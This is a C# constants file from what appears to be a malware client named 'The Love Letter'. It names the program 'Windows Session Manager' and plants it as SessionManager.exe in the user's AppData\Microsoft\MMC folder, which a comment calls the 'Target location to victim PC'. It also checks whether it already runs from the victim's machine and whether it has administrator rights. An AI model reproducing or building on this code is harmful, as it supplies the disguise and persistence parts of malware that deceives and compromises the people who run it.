using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Client
{
    /// <summary>
    /// Constants not belonging to any class.
    /// </summary>
    public static class Constants
    {
        public static string Title = "Windows Session Manager";
        public static string AppDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static string MMCFolder = System.IO.Path.GetFullPath(AppDataFolder + @"\Microsoft\MMC");

        /// <summary>
        /// Target location to victim PC
        /// </summary>
        public static string MMCFile = System.IO.Path.GetFullPath(MMCFolder + @"\SessionManager.exe");

        public static string MyPath = Assembly.GetExecutingAssembly().Location;

        public static string MyName = Path.GetFileNameWithoutExtension(MyPath);
        /// <summary>
        /// Checks if the current program is already in the victim's PC via path.
        /// </summary>
        public static bool IsInVictimPC() {
            return Utilities.Filepath.NormalizePath(MyPath) == Utilities.Filepath.NormalizePath(MMCFile);
        }

        public static int MyProcessID = Process.GetCurrentProcess().Id;

        public static float Version = 0.1f;

        /// <summary>
        /// Checks if The Love Letter is running as administrator because if it does...things will get really interesting.
        /// </summary>
        public static bool IsAdmin()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
